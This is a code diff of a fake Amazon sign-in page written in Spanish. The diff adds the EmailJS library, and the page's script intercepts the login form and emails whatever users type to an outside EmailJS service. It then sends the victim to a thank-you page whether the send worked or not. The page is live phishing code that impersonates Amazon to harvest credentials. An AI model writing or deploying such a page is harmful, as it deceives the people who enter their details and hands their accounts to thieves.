@@ -7,6 +7,8 @@
     <link rel="icon"
         href="https://static.vecteezy.com/system/resources/previews/019/136/322/non_2x/amazon-logo-amazon-icon-free-free-vector.jpg"
         type="image/png">
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
     <title>Iniciar sesión en Amazon</title>
     <style>
         body {
@@ -176,22 +178,22 @@
         emailjs.init('user_f80imbc'); // Reemplaza con tu userID
 
         // Manejamos el evento de envío del formulario
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
+        document.getElementById('loginForm').addEventListener('submit', function (event) {
             event.preventDefault();  // Evitamos el envío tradicional del formulario
 
             // Obtenemos los datos del formulario
             var formData = new FormData(this);
- 
+
             // Enviamos el formulario utilizando EmailJS
             emailjs.sendForm('service_f80imbc', 'template_8dg1bfi', formData)
-                .then(function(response) {
+                .then(function (response) {
                     console.log('SUCCESS!', response.status, response.text);
                     // Redirigimos a la página de agradecimiento si el envío es exitoso
-                    window.location.href = 'gracias.html'; 
-                }, function(error) {
+                    window.location.href = 'gracias.html';
+                }, function (error) {
                     console.log('FAILED...', error);
                     // Si hay un error en la entrega, aún redirigimos a gracias.html
-                    window.location.href = 'gracias.html'; 
+                    window.location.href = 'gracias.html';
                 });
         });
     </script>
